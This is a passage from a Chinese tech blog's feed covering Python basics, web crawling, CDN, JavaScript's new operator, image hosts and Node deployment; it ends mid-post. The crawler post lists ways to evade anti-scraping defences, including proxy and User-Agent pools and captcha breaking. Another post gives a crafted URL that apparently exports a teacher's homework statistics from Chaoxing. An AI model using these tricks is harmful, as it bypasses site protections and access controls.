    <content type="html"><![CDATA[<blockquote><p>今天来聊聊程序是如何控制的？</p></blockquote><h1 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h1><ul><li>选择结构（分支结构）：根据程序中给出的条件语句，判断当前条件 是否满足，如果满足就执行相应的语句块，如果不满足则什么都不执 行或者执行预先定义好的另外一组语句块</li><li>if语句块的语法格式，根据实际情况elif和else分支可以没有： <figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">if 条件</span>: <br>要执行的语句块 <br><span class="hljs-attribute">elif 条件</span>: <br>要执行的语句块 <br><span class="hljs-attribute">else</span>: <br>要执行的语句块<br></code></pre></td></tr></table></figure></li><li><code>==</code>用来判断运算符两边的表达式所得到的值是否相等，如果相 等，则返回true（真）；如果不等，则返回false（假）</li><li><code>!=</code>用来判断运算符两边的表达式所得到的值是否不等，如果不 等，则返回true（真）；如果相等，则返回false（假）</li><li>与<code>==</code>和<code>！=</code>相似的运算符还有<code>&gt;</code>,<code>&gt;=</code>,<code>&lt;</code>,<code>&lt;=</code></li><li>关键字<code>and</code>表示并且的意思，即只有同时满足使用and连接的若 干条件，算式的最终结果才能为true，否则结果为false</li><li>关键字<code>or</code>表示或者的意思，即使用or连接的若干条件中，只要 有任意一个是成立的，则算式的最终结果就为true，否则为false</li><li>关键字<code>not</code>表示逻辑非，即取反操作，对true（真）取反得到 false（假），对false（假）取反得到true（真）</li></ul><h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><ul><li><code>for循环</code>是Python循环的一种，其语法格式为： <figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">for 循环变量 in 循环变量取值范围</span>: <br>循环执行的语句块（循环体）<br></code></pre></td></tr></table></figure></li><li><code>range()函数</code>，它的功能是产生指定的整数序列范围，语法格式为： <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">range</span><span class="hljs-params">(起始数值,结束数值,递增值)</span></span><br></code></pre></td></tr></table></figure></li><li><code>while语句</code>的语法格式： <figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">while</span> 循环的条件: <br>循环执行的语句块（循环体）<br></code></pre></td></tr></table></figure><blockquote><p>下面我们来谈谈软件的设计方法</p></blockquote></li></ul><h1 id="原型法"><a href="#原型法" class="headerlink" title="原型法"></a>原型法</h1><p>原型法的核心思想就是快速搭建一个程序的可运行版本，这个最 初的版本可能只是包含一些最简单的功能，然后再不断修改和完 善该版本的程序，直到最终完成程序的所有功能</p><p>使用该方法进行编程的好处就是最大程度保证每一个阶段产生的 程序都是正确的</p><h1 id="几个特别的语句"><a href="#几个特别的语句" class="headerlink" title="几个特别的语句"></a>几个特别的语句</h1><ul><li>程序在执行循环语句时，若碰到了<code>break</code>语句，则终止整个循环， 执行循环下面的语句。</li><li>程序在执行循环语句时，若碰到了<code>continue</code>语句，则终止本次循 环，执行下一次的循环。</li><li>如果想定义一个什么事也不做的空语句块，可以用<code>pass</code>语句</li><li>else关键字的用法 </li><li>else语句在分支结构中表示不满足if和elif判断条件以外的分支； </li><li>在while循环中它表示当循环条件不再成立时，则执行else包 含的语句块； </li><li>在for循环中它表示当循环范围中所有元素都已经被尝试过， 则执行else包含的语句块</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫是什么？爬虫简介及应用</title>
    <link href="/2020/03/27.html"/>
    <url>/2020/03/27.html</url>
    
    <content type="html"><![CDATA[<p>1 什么是网络爬虫</p><p>爬虫的简单定义</p><p>网络爬虫（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动地抓取万维网信息的程序或者脚本。另外一些不常使用的名字还有蚂蚁、自动索引、模拟程序或者蠕虫。</p><p>简单来说：使用事先写好的程序去抓取网络上所需要的数据，这样的程序就叫网络爬虫。</p><p>爬虫的分类</p><p>网络爬虫可以分为通用网络爬虫(如搜索引擎的爬虫，根据几个URL的种子不断的去抓取数据)和聚焦网络爬虫(有选择性的抓取预先定义好的主题和相关页面的网络爬虫)。</p><p>A.通用网络爬虫：</p><p>搜索引擎</p><p>B.聚焦网络爬虫：</p><p>针对某一特定领域的数据进行抓取的程序。飞猪、携程的行程信息，天眼查的企业信息等。</p><p>2 为什么需要爬虫</p><p>爬虫的用途</p><p>A.解决冷启动问题：</p><p>一些论坛的假用户</p><p>B.搜索引擎的根基：</p><p>做搜索引擎少不了爬虫程序；</p><p>C.建立起知识图谱，帮助建立机器学习的训练集：</p><p>维基百科是一个较好的数据集来源；</p><p>D.可以制作各种商品的比价，趋势分析等；</p><p>E.其他：</p><p>比如分析淘宝上竞争对手的数据；分析微博的数据传递影响力，政府的舆情分析，分析人与人之间的关系等等。</p><p>总之一句话：在当今的大数据时代，做任何价值分析的前提是数据，而爬虫则是获得这个前提的一个低成本高收益手段。</p><p>怎么做爬虫</p><p>Python 、node 、java</p><p>初级爬虫工程师：</p><p>1.Web前端的知识：HTML，CSS，JavaScript，DOM，DHTML，Ajax，jQuery，json等；</p><p>2.正则表达式，能提取正常一般网页中想要的信息，比如某些特殊的文字，链接信息，知道什么是懒惰，什么是贪婪型的正则；</p><p>3.会使用re，cheerio，XPath等获取一些DOM结构中的节点信息；</p><p>4.知道什么是深度优先，广度优先的抓取算法，及实践中的使用规则；</p><p>5.能分析简单网站的结构。</p><p>中级爬虫工程师：</p><p>1.了解什么是Hash，会使用简单的MD5，SHA1等算法对数据进行Hash以便存储；</p><p>2.熟悉HTTP，HTTPS协议的基础知识，了解GET，POST方法，了解HTTP头中的信息，包括返回状态码，编码，user-agent，cookie，session等；</p><p>3.能设置User-Agent进行数据爬取，设置代理等；</p><p>4.知道什么是Request，什么是Response，会使用Fiddler, Wireshark等工具抓取及分析简单的网络数据包；对于动态爬虫，要学会分析Ajax请求，模拟制造Post数据包请求，抓取客户端session等信息，对于一些简单的网站，能够通过模拟数据包进行自动登录；</p><p>5.对于比较难搞定的网站，学会使用浏览器+selenium抓取一些动态网页信息；</p><p>6.并发下载，通过并行下载加速数据抓取；多线程的使用。</p><p>高级爬虫工程师：</p><p>……</p><p>3 爬虫的合法性问题</p><p>目前还处于不明确的蛮荒阶段，“允许哪些行为”这种基本秩序还处于建设中。至少目前来看，如果抓取的数据为个人所用，则不存在问题；如果数据用于转载，那么抓取数据的类型就很重要了：一般来说，当抓取的数据是实现生活中的真实数据（比如，营业地址，电话清单）时，是允许转载的，但是，如果是原创数据（比如，意见或评论），通常就会受到版权限制，而不能转载。(知乎的复制会粘贴上版权信息，都是爬虫可以轻松拿到干净的数据)</p><p>注意：不管怎么样，作为一个访客，应当约束自己的抓取行为，这就是说要求下载请求的速度需要限定在一个合理值之内（对别人服务器和维护人员的同情），并且还需要设定一个专属的用户代理来标识自己。</p><p>4 爬虫的准备工作：网站的背景调研</p><p>网站的背景调研对聚焦的网络爬虫而言至关重要，正所谓：知己知彼，百战不殆。</p><p>robots协议</p><p>识别网站用了何种技术</p><p>找网站的所有者</p><p>5爬虫的实现</p><p>插入企查查案例</p><p>总结：一个通用爬虫的流程如下：</p><p>设置种子站点</p><p>获取网站信息</p><p>错误处理及日志记录</p><p>6 数据的类型</p><p>网页中数据的类型简单来说可以分成以下三类：结构化数据、半结构化数据和非结构化数据。</p><p>7 怎么提取网页中的信息</p><p>XPath</p><p>选取节点</p><p>正则表达式re</p><p>被用来检索\替换那些符合某个模式(规则)的文本,对于文本过滤或规则匹配,最强大的就是正则表达式,是python爬虫里必不可少的神兵利器。</p><p>8 动态网页的使用场景</p><p>先看下面一个例子：</p><p>这是京东上看一本书的场景。我们发现打开一本书之后，书的价格，排名等信息及书的评论信息不是在我们第一次打开网站时就立即加载进来的。而是通过二次请求或多次的异步请求获取的。这样的页面就是动态页面。</p><p>关于动态页面使用的场景：</p><p>希望异步刷新的场景。有些网页内容很多，一次加载完对服务器压力很大，而且有的用户不会去查看所有内容；</p><p>GET方法</p><p>POST方法</p><p>更加难以对付的动态网站</p><p>1． 应对需要多次数据的交互模拟的网站</p><p>我们有时会遇到像淘宝这样的大型网站，对数据版权看得特别重的，它们的网站有大量的工程师和技术人员去维护，它们也可能在技术手段上采用多次交互数据包的方式来完成网站服务器与用户浏览器之间的交互。如果此时还采用传统的分析数据包的方式会比较的复杂，难度较高。那么，有没有一劳永逸的方法，来解决此类问题呢？</p><p>我们的解决方案是：Selenium + PhantomJS。</p><p>我们的爬虫其实就是在做模拟浏览器的行为。</p><p>2．Electron</p><p>Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。</p><p>3． PhantomJS</p><p>一个基于webkit无界面(headless)的浏览器,它可以把网站加载到内存中并执行页面上的JS，但它没有图形用户界面，所以耗费的资源比较少；</p><p>关于动态网站信息抓取的总结</p><p>总的来说，我们的爬虫要尽量模拟的看起来就像是真正的用户在浏览器上访问服务器网站的行为。如果我们使用GET或POST的方式来模拟浏览器与服务器间通信的行为，成本比较低，但是应对复杂的网站或者服务器精心防御的网站来说是很难骗过服务器的。Electron+PhantomJS的方案则会让我们的程序看起来更像是普通的用户，但是它的效率相对而言会降低很多，速度也会慢很多。在大规模爬去数据时可能遇到许多新的挑战。（比如网站尺寸的设置，等待时间的设定等）</p><p>Cookie 、session、</p><p>终极武器</p><p>Nightmare</p><p>浏览器事件: goto,back,forward,refresh,</p><p>用户事件: click,mousedown,mouseup,mouseover,type,insert,select,check,uncheck,selectscrollTo</p><p>向网页注入脚本: .js .css的文件类型原理是跟油猴差不多，可以编写自己的js代码注入十分方便</p><p>wait 函数可以按照延迟时间或者一个 dom 元素的出现</p><p>evaluate 以浏览器的环境运行的脚本函数，然后返回一个 promise 函数</p><p>需要加载全网站，一般无防护网站没必要。</p><p>9高效率的爬取数据</p><p>人多力量大，多人干事更快。多个爬虫一起干活效率也更高。</p><p>随着爬虫抓取数据的提速，及数据量抓取的庞大，问题也会凸显。对方也会尝试用各种手段来禁止爬虫的行为。</p><p>10反爬及应对反爬的策略</p><p>随着抓取的数据量到一定程度，数据重复及爬取过程中的死链问题会凸显。怎么来解决反爬问题呢？</p><p>网站如何发现爬虫</p><p>一般来说，网站会有以下一些简单的策略发现爬虫程序：</p><p>1）单一IP非常规的访问频次；</p><p>2）单一IP非常规的数据流量；</p><p>3）大量重复简单的网站浏览行为，只下载网页，没有后续的JS,CSS请求；</p><p>5）通过一些陷阱来发现爬虫，例如一些通过CSS对用户隐藏的链接，只有爬虫才会访问；</p><p>网站如何进行反爬</p><p>一般来说网站会采用下面两个简单的策略来防止爬虫：</p><p>1.大量使用动态网页，是的爬虫的爬取难度增加，重要数据都拿不到，即使爬虫采用了Web环境来渲染（内置浏览器），也会大大增加爬虫的负担和爬虫时间；（当然，采用动态加载的技术，对服务器的负担也会大大减轻）</p><p>2.基于流量的拒绝：开启带宽限制模块，限制每个IP最多连接数，最大带宽等；</p><p>爬虫如何发现自己可能被网站识别了</p><p>如果爬取过程中出现以下情况，那么小心了，你的爬虫可能被网站发现了：</p><p>1.验证码出现；</p><p>2.Unusual content delivery delay 非常规的延时;</p><p>3.Frequent response with HTTP 403, 404, 301 or 50x error;</p><p>4.直接接口返回骂人的话……</p><p>爬虫应对反爬的策略</p><p>我们可以从以下几个方面来考虑应对反爬：</p><p>1）User-Agent池；</p><p>2）IP代理服务器池；</p><p>3）CookieJar等的管理；</p><p>4）协议的细节考虑，如：需要大量的实践经验总结的</p><p>抓取数据时不处理CSS，JS等；</p><p>nofollow属性；css的display属性；探测陷阱；</p><p>验证refer locator等；</p><p>5）使用分布式的多机策略；爬慢点，把爬虫放到访问频繁的主站IP子网下，如教育网；</p><p>6）使用了规则来批量爬取，需对规则进行组合；</p><p>7）验证码的搞定：机器学习，图像识别；</p><p>8）尽可能遵守Robots协议；</p><p>9）与所有方协调接口与时间段；</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CDN是什么？谈谈有关CDN的小知识</title>
    <link href="/2020/03/26.html"/>
    <url>/2020/03/26.html</url>
    
    <content type="html"><![CDATA[<ol><li>什么是CDN：</li></ol><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。 基本原理 CDN的基本原理是广泛采用各种缓存服务器，将这些缓存服务器分布到用户访问相对集中的地区或网络中，在用户访问网站时，利用全局负载技术将用户的访问指向距离最近的工作正常的缓存服务器上，由缓存服务器直接响应用户请求。</p><ol start="2"><li>CDN的特点</li></ol><p>（1）提升网站的性能</p><p>使用CDN最大的益处是为你的服务器提供“分流”，节省了你的带宽，减少了服务器的压力，很多CDN厂商提供的资源访问服务加载速度还是比较快的（墙内除外）。</p><p>（2）文件缓存</p><p>对于那些被普遍使用的资源文件（比如j q u e r y），如果用户在访问你网站之前已经访问过其他使用该CDN的网站，那么在用户浏览器中已经对该资源文件做了缓存，对于你的网站来说，这是个不错的性能提升！</p><p>（3）高可用</p><p>相信微软、谷歌、雅虎的服务器相对于你自身的服务器来说更加可靠些，他们提供了高可用、低网络延迟，降低了数据包的丢失几率。你无需担心服务器宕机或者网络延迟的问题。</p><ol start="3"><li>CDN支持4种调度类型</li></ol><p>（1）智能DNS</p><p>智能计算，就近最佳节点为网民提供服务。</p><p>（2）HTTP DNS：</p><p>客户端直接调用HttpDNS接口获取缓存服务器IP组，再择优向IP组中的缓存服务器发送请求，替代常规DNS调度策略，适用于客户端，且客户端需稍作修改进行HttpDNS接口调用。</p><p>（3）边缘302：</p><p>针对因用户LocalDNS配置错误引起的解析错误，缓存服务器可根据终端IP进行判断，并通过302方式响应终端最优缓存服务器IP供终端访问。适用于大文件下载</p><p>（4）中心302：</p><p>调度服务器接受终端Http请求，可根据终端IP及url请求热度，将用户请求通过302方式调度至最优的缓存服务器上进行响应。</p><ol start="4"><li>CDN纠错小常识</li></ol><p>用户使用KS3中java的sdk时出现403报错，并返回“SignatureDoesNotMatch”的错误码，该怎么办？</p><p>处理：如果返回“SignatureDoesNotMatch”的错误码，说明签名出现错误</p><p>（1）确认AccessKey是否多写了空格;</p><p>（2）当请求的header中包含Content-MD5时，StringToSign中需要包含请求内容数据的MD5值, 使用Base64编码;</p><p>（3）Content-Type 表示请求内容的类型，取HTTP header中的Content-Type;</p><p>（4）Date 取HTTP Header中的Date，且必须为 HTTP1.1 中支持的 GMT 格式，请注意，您发送请求的时间（客户端系统时间）与服务端收到请求的时间，间隔前后不得超出15分钟，否则该请求将被认为无效并返回错误，请检查发送请求设备的系统时间与标准时间是否一致;</p><p>（5）CanonicalizedKssHeaders 取HTTP请求中的以x-kss开头的Header组合;</p><p>（6）CanonicalizedResource 取用户访问的资源;</p><p>（7）签名构造规则见API接口文档中的签名。</p>]]></content>
    
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何自己实现 JavaScript 的 new 操作符？</title>
    <link href="/2020/03/25.html"/>
    <url>/2020/03/25.html</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>new</code> 大家肯定都不陌生，单身没有对象的时候就 <code>new</code> 一个，很方便。那么它在创建实例的时候，具体做了哪些操作呢？今天我们就来一起分析一下</p><h1 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h1><p>在介绍 <code>new</code>之前，必须要知道什么是构造函数。</p><p>构造函数和普通函数在写法上没有任何区别，当一个函数通过 <code>new Fun()</code> 调用时，就叫做构造函数，构造函数首字母通常大写。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">User</span>(<span class="hljs-type">name</span>) &#123;<br>    this.name = <span class="hljs-type">name</span>;<br>&#125;<br><br>let u = <span class="hljs-built_in">new</span> <span class="hljs-keyword">User</span>(<span class="hljs-string">&#x27;leo&#x27;</span>);<br></code></pre></td></tr></table></figure><p>这里，<code>User</code> 就是构造函数，当然你也可以直接调用 <code>User()</code>，但是这样就起不到创建实例的作用，在非严格模式下，会把 <code>name</code> 属性挂在 <code>window</code> 上。</p><h1 id="new-操作符"><a href="#new-操作符" class="headerlink" title="new 操作符"></a>new 操作符</h1><p>那么 <code>new</code> 操作符到底做了什么事情呢，可以创建出一个实例？</p><blockquote><p><code>new</code> 运算符创建一个用户定义的对象类型的实例或具有构造函数的内置对象的实例。new关键字会进行如下的操作：</p></blockquote><ul><li>1.创建一个空的简单JavaScript对象（即<code>**&#123;&#125;**</code>）；</li><li>2.链接该对象（即设置该对象的构造函数）到另一个对象 ；</li><li>3.将步骤1新创建的对象作为<code>**this**</code>的上下文 ；</li><li>4.如果该函数没有返回对象，则返回<code>**this**</code>。</li></ul><p>以上引用自<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new">new 操作符 - MDN</a></p><p>可能第 2、4 步大家看的不是很明白，这里我重新总结一下这 4 个步骤：</p><p>1.创建一个空对象 <code>u = &#123;&#125;</code><br>2.绑定原型，<code>u.__proto__ = User.prototype</code><br>3.调用 <code>User()</code> 函数，并把空对象 <code>u</code> 当做 <code>this</code> 传入，即 <code>User.call(u)</code><br>4.如果 <code>User()</code> 函数执行完自己 <code>return</code> 一个 <code>object</code> 类型，那么返回此变量，否则返回 <code>this</code>，注意：如果构造函数返回基本类型值，则不影响，还是返回 <code>this</code></p><h1 id="自己实现一个-new"><a href="#自己实现一个-new" class="headerlink" title="自己实现一个 new"></a>自己实现一个 new</h1><p>知道了 <code>new</code> 操作符的原理，下面我们自己来实现一个 <code>FakeNew</code> 函数。</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FakeNew</span><span class="hljs-params">()</span> <span class="hljs-comment">&#123;</span></span><br><span class="hljs-function"><span class="hljs-comment">    let obj = &#123;&#125;</span>;</span><br>  <br>    <span class="hljs-comment">// 将类数组 arguments 转为数组，同时将第一个参数也就是构造函数 shift 出来</span><br>    let <span class="hljs-function"><span class="hljs-keyword">Constructor</span> = [].<span class="hljs-title">shift</span>.<span class="hljs-title">apply</span><span class="hljs-params">(arguments)</span>;</span>  <br><br>    <span class="hljs-comment">// 绑定原型</span><br>    obj.__proto__ = <span class="hljs-keyword">Constructor</span>.prototype;    <br>  <br>    <span class="hljs-comment">// 调用构造函数，将 obj 当做 this 传入</span><br>    let res = <span class="hljs-keyword">Constructor</span>.apply(obj, arguments);    <br><br>    <span class="hljs-comment">// 返回</span><br>    return typeof res === <span class="hljs-string">&#x27;object&#x27;</span> ? res : obj;   <br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">User</span><span class="hljs-params">(<span class="hljs-keyword">name</span>)</span> <span class="hljs-comment">&#123;</span></span><br><span class="hljs-function"><span class="hljs-comment">    this.name = name;</span></span><br><span class="hljs-function"><span class="hljs-comment">&#125;</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">User</span>.<span class="hljs-title">prototype</span>.<span class="hljs-title">getName</span> = <span class="hljs-title">function</span><span class="hljs-params">()</span> <span class="hljs-comment">&#123;</span></span><br><span class="hljs-function"><span class="hljs-comment">    return this.name;</span></span><br><span class="hljs-function"><span class="hljs-comment">&#125;</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">let</span> <span class="hljs-title">u</span> = <span class="hljs-title">FakeNew</span><span class="hljs-params">(User, <span class="hljs-string">&#x27;leo&#x27;</span>)</span>;</span><br>console.log(u);<br>console.log(u.getName());<br></code></pre></td></tr></table></figure><p>相应关键步骤的注释已经附在代码里面了，这样我们就实现了一个 <code>new</code> 操作，相信大家以后再看到 <code>new</code>，会有一种通透的感觉了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客图片加载？多种解决方案供您选择</title>
    <link href="/2020/03/24.html"/>
    <url>/2020/03/24.html</url>
    
    <content type="html"><![CDATA[<h1 id="ImgURL"><a href="#ImgURL" class="headerlink" title="ImgURL"></a>ImgURL</h1><p>ImgURL 是由国内独立开发者制作的图床工具，已在 GitHub 开源。ImgURL 支持拖拽、粘贴等多种上传方式。在上传测试中，GIF 耗时 5 秒，PNG 实现秒传，处于可接受的范围内。</p><p>ImgURL 的图片编辑功能着实让人眼前一亮。在你上传了一张图片后，你可以对其进行裁切、压缩，甚至是添加水印的操作。除了可以将图片导出为 URL 外，ImgURL 还支持选择 HTML、Markdown 等格式。</p><p>官网地址：<a href="https://imgurl.org/">https://imgurl.org/</a></p><a id="more"></a><p>项目GitHub 地址：<a href="https://github.com/helloxz/imgurl">https://github.com/helloxz/imgurl</a></p><h1 id="upload-cc"><a href="#upload-cc" class="headerlink" title="upload.cc"></a>upload.cc</h1><p>upload.cc 采用了类似 Material Design 的设计，界面清晰明了。它支持 JPEG、PNG 等五种常见格式，同样支持拖拽上传及多张照片同时上传。上传后的图片会显示在左侧，对于不需要的图片，你可以随时删除。</p><p>upload.cc 提供了浏览器插件。如果你使用的是 Chrome 或 Firefox 浏览器，可以通过插件直接上传图片。插件的下载链接在这里：Chrome、Firefox。在测试中，GIF 上传耗时近 8 秒，PNG 可以秒传。</p><p>upload.cc 对片大小有限制。单张照片最大 5M，且仅支持常见格式，适合需要频繁分享小图的用户</p><p>官网地址：<a href="https://upload.cc/">https://upload.cc/</a></p><h1 id="SM-MS"><a href="#SM-MS" class="headerlink" title="SM.MS"></a>SM.MS</h1><p>SM.MS 支持上传单张最大 5M 的图片，每次上传最多支持 10 张图片，适合作为主力图床使用。SM.MS 还提供了官方 iOS 和 Android 客户端，你可以在 App Store 或 Google Play 免费下载</p><p>官网地址：<a href="https://sm.ms/">https://sm.ms/</a></p><h1 id="路过图床"><a href="#路过图床" class="headerlink" title="路过图床"></a>路过图床</h1><p>它以「无限空间」和「无限流量」作为最大的亮点，同时具有全球 CDN 加速以确保高速、稳定。在上传测试中，GIF 上传耗时约 5 秒。路过图床较为繁琐的一点是，它会先显示预览和编辑，需要进行二次确认。</p><p>路过图床仅对单次上传的大小做出了限制，游客只能上传小于 5M 的图片，注册后可上传 10M 内的图片，适合作为主力图床使用。路过图床还为电商用户提供了专门的上传空间，但是路过会偶尔来大姨妈，图片速度不稳定，不是很建议用</p><p>官网地址：<a href="https://imgchr.com/">https://imgchr.com/</a></p><h1 id="Postimage"><a href="#Postimage" class="headerlink" title="Postimage"></a>Postimage</h1><p>Postimage 是一款来自国外的图床工具，支持按照一定大小缩放图片及设置图片自动删除。在上传完成后，Postimage 会为你生成多种链接格式以满足不同需求。令人眼前一亮的是，Postimage 还会生成一个用于删除当前图片的链接，你只要访问那个链接即可将图片删除</p><p>官网地址：<a href="https://postimages.org/">https://postimages.org/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习通下载老师后台的作业统计</title>
    <link href="/2020/03/23.html"/>
    <url>/2020/03/23.html</url>
    
    <content type="html"><![CDATA[<p><strong>学习通下载老师后台的作业统计</strong></p><p>1.首先打开学习通个人中心：<a href="http://i.chaoxing.com/">http://i.chaoxing.com/</a>，点击选择的课程<br><img src="https://s1.ax1x.com/2020/03/23/87AP2Q.png" srcset="/img/loading.gif" lazyload alt="1"></p><a id="more"></a><p><img src="https://s1.ax1x.com/2020/03/23/87A2i8.png" srcset="/img/loading.gif" lazyload alt="2"></p><p>2.复制了上面那一段之后，我们将复制的内容放进下面的地址里<br><code>https://mooc1-1.chaoxing.com/work/exportAnswerRecord?将上面复制的地址粘贴到这里&amp;mooc=1</code></p><ul><li>例如我的地址是这个：courseId=云雾&amp;classId=云雾&amp;workId=云雾<br><code>那么下载地址就是：https://mooc1-1.chaoxing.com/work/exportAnswerRecord?courseId=云雾&amp;classId=云雾&amp;workId=云雾&amp;mooc=1</code></li></ul><p>3.地址弄好之后，复制到浏览器打开，就会自动下载作业的统计文档~..<br><img src="https://s1.ax1x.com/2020/03/23/87AXz4.png" srcset="/img/loading.gif" lazyload alt="3"></p><p><em>声明：此方法不可用作违反行为，否则产生的一切后果自负</em></p><p>原文链接：<a href="https://lioeo.cn/76.html">https://lioeo.cn/76.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nodejs - 在阿里云轻量服务器上部署Node环境</title>
    <link href="/2020/03/22.html"/>
    <url>/2020/03/22.html</url>
    
    <content type="html"><![CDATA[<p>前往根目录 :<br><code>cd /</code><br>下载Node :<br><code>wget -c https://nodejs.org/dist/v12.1...</code><br>解压 :<br><code>tar -xvf node-v12.16.1-linux-x64.tar.xz</code><br>重命名 :<br><code>mv node-v12.16.1-linux-x64 nodejs</code><br>建立软连接, 这样方便在全局使用相关命令 :</p><a id="more"></a><p><code>ln -s /nodejs/bin/npm /usr/bin/npm</code><br><code>ln -s /nodejs/bin/node /usr/bin/node</code></p><p>参考资料 :<br>Node官网 : <a href="https://nodejs.org/en/">https://nodejs.org/en/</a><br>查看服务器版本信息 : <a href="https://blog.csdn.net/pansanday/article/details/79697562">https://blog.csdn.net/pansanday/article/details/79697562</a><br>linux服务器安装node环境及项目部署 : <a href="https://zhuanlan.zhihu.com/p/49741341">https://zhuanlan.zhihu.com/p/49741341</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python字符串格式化</title>
    <link href="/2020/03/21.html"/>
    <url>/2020/03/21.html</url>
    
    <content type="html"><![CDATA[<p>Python2.6 开始，新增了一种格式化字符串的函数 str.format()，它增强了字符串格式化的功能。相对于老版的%格式方法，它有很多优点。</p><p>1.在%方法中%s只能替代字符串类型，而在format中不需要理会数据类型；<br>2.单个参数可以多次输出，参数顺序可以不相同；<br>3.填充方式十分灵活，对齐方式十分强大；<br>4.官方推荐用的方式，%方式将会在后面的版本被淘汰。</p><a id="more"></a><h1 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h1><p>1、按照默认顺序，不指定位置</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;&#123;&#125; &#123;&#125;&quot;</span>.format(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;world&quot;</span>)</span></span> )<br><br>hello world<br></code></pre></td></tr></table></figure><p>2、设置指定位置，可以多次使用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;&#123;0&#125; &#123;1&#125; &#123;0&#125;&quot;</span>.format(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-string">&quot;or&quot;</span>)</span></span>)<br><br>hello or hello<br></code></pre></td></tr></table></figure><p>3、使用列表格式化</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">person = &#123;&quot;name&quot;:&quot;opcai&quot;,&quot;age&quot;:<span class="hljs-number">20</span>&#125;<br><br>print(&quot;My name is &#123;name&#125; . I am &#123;age&#125; years old .&quot;.format(\*\*person))<br><br>My <span class="hljs-type">name</span> <span class="hljs-keyword">is</span> opcai . I am <span class="hljs-number">20</span> years <span class="hljs-built_in">old</span> <br></code></pre></td></tr></table></figure><p>4、通过列表格式化</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">stu = \<span class="hljs-selector-attr">[<span class="hljs-string">&quot;opcai&quot;</span>,<span class="hljs-string">&quot;linux&quot;</span>,<span 